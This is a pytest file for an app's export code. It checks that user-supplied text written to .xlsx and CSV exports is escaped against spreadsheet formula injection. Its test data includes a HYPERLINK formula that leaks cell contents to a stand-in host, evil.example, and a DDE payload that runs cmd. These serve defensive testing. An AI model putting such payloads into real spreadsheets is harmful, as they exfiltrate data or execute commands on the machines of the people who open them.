"""
Spreadsheet formula injection in exports.

Free text from any user (names, notes, comments, descriptions) is written into
the site .xlsx and the project CSV. A value starting with = + - @ TAB or CR
would be stored as / evaluated as a formula, so `_safe_cell` prefixes it with
a single quote. Numbers, dates and None are untouched.

The workbook test swaps in a recording fake `openpyxl` so it runs without the
package installed; a second test checks the real file when openpyxl is
available (it is in CI via requirements.txt).
"""

import io
import sys
import types
from collections import defaultdict
from datetime import date
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest

from app.models.site import Site
from app.models.tag import Tag
from app.models.team import Team
from app.models.user import User
from app.routers.export import _safe_cell, build_site_export_workbook, generate_csv

PAYLOAD = '=HYPERLINK("http://evil.example/?"&A1,"open")'


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (PAYLOAD, "'" + PAYLOAD),
        ("+1+1", "'+1+1"),
        ("-2+3", "'-2+3"),
        ("@SUM(A1)", "'@SUM(A1)"),
        ("\tcmd", "'\tcmd"),
        ("\rcmd", "'\rcmd"),
        ("Plain name", "Plain name"),
        ("a=b", "a=b"),
        ("", ""),
        (None, None),
        (-5, -5),
        (12.5, 12.5),
        (date(2026, 1, 5), date(2026, 1, 5)),
    ],
)
def test_safe_cell(value, expected):
    assert _safe_cell(value) == expected


def test_project_csv_escapes_user_text():
    tasks = [
        {
            "id": 1,
            "name": PAYLOAD,
            "outline_level": 1,
            "start": date(2026, 1, 5),
            "finish": date(2026, 1, 9),
            "duration": 5,
            "predecessors": "",
            "percent_complete": 0,
            "milestone": False,
            "notes": "@cmd",
        }
    ]

    content = generate_csv(tasks, "Project")

    data_row = content.splitlines()[1]
    assert "'=HYPERLINK" in data_row
    assert ",'@cmd" in data_row
    assert data_row.startswith("1,")


# ---------------------------------------------------------
# Site workbook
# ---------------------------------------------------------


def _site_db():
    """AsyncSession stand-in answering each SELECT by its entity."""
    site = Site(id=1, name=PAYLOAD, location="+41 Lab", timezone="Europe/Zurich", active=1)
    user = User(
        id=7,
        email="@alice@example.com",
        first_name="-Alice",
        last_name="Smith",
        role="user",
        max_capacity=80,
        active=1,
    )
    tag = Tag(id=3, name="@SUM(A1:A9)", color="#123456")
    team = Team(id=5, site_id=1, name="=cmd|' /C calc'!A0", description="+Lab", active=True)
    team.members = [user]
    rows = {Site: [site], User: [user], Tag: [tag], Team: [team]}

    async def execute(stmt, *args, **kwargs):
        entity = stmt.column_descriptions[0].get("entity")
        found = rows.get(entity, [])
        result = MagicMock()
        result.scalar_one_or_none.return_value = found[0] if found else None
        result.scalars.return_value.all.return_value = list(found)
        result.__iter__.return_value = iter([])
        return result

    db = MagicMock()
    db.execute = execute
    return db


class _FakeSheet:
    def __init__(self):
        self.rows: list[list] = []
        self.column_dimensions = defaultdict(SimpleNamespace)
        self.freeze_panes = None

    def append(self, row):
        self.rows.append(list(row))

    def __getitem__(self, index):
        return [SimpleNamespace() for _ in self.rows[index - 1]]


class _FakeWorkbook:
    sheets: dict[str, _FakeSheet] = {}

    def __init__(self):
        self.active = object()
        _FakeWorkbook.sheets = {}

    def remove(self, _sheet):
        pass

    def create_sheet(self, title):
        sheet = _FakeSheet()
        _FakeWorkbook.sheets[title] = sheet
        return sheet

    def save(self, buffer):
        buffer.write(b"")


def _fake_openpyxl():
    root = types.ModuleType("openpyxl")
    root.Workbook = _FakeWorkbook
    styles = types.ModuleType("openpyxl.styles")
    styles.Font = lambda **kw: None
    styles.PatternFill = lambda **kw: None
    utils = types.ModuleType("openpyxl.utils")
    utils.get_column_letter = lambda idx: f"C{idx}"
    return {"openpyxl": root, "openpyxl.styles": styles, "openpyxl.utils": utils}


@pytest.mark.asyncio
async def test_site_workbook_escapes_every_string_cell():
    with patch.dict(sys.modules, _fake_openpyxl()):
        await build_site_export_workbook(_site_db(), 1)

    sheets = _FakeWorkbook.sheets
    site_row = sheets["Site"].rows[1]
    assert site_row[0] == 1  # numbers untouched
    assert site_row[1] == "'" + PAYLOAD
    assert site_row[2] == "'+41 Lab"
    user_row = sheets["Users"].rows[1]
    assert user_row[0] == 7
    assert user_row[1] == "'@alice@example.com"
    assert user_row[2] == "'-Alice"
    assert user_row[3] == "Smith"
    assert user_row[6] == 80
    assert sheets["Tags"].rows[1][1] == "'@SUM(A1:A9)"
    assert sheets["Teams"].rows[1][1:3] == ["'=cmd|' /C calc'!A0", "'+Lab"]
    assert sheets["Team members"].rows[1][1] == "'=cmd|' /C calc'!A0"

    # No string cell anywhere in the workbook starts with a formula trigger.
    for sheet in sheets.values():
        for row in sheet.rows:
            for value in row:
                if isinstance(value, str):
                    assert not value.startswith(("=", "+", "-", "@", "\t", "\r")), value


@pytest.mark.asyncio
async def test_site_workbook_cells_are_text_not_formulas():
    openpyxl = pytest.importorskip("openpyxl")

    content, _filename = await build_site_export_workbook(_site_db(), 1)

    wb = openpyxl.load_workbook(io.BytesIO(content))
    cell = wb["Site"]["B2"]
    assert cell.value == "'" + PAYLOAD
    assert cell.data_type == "s"
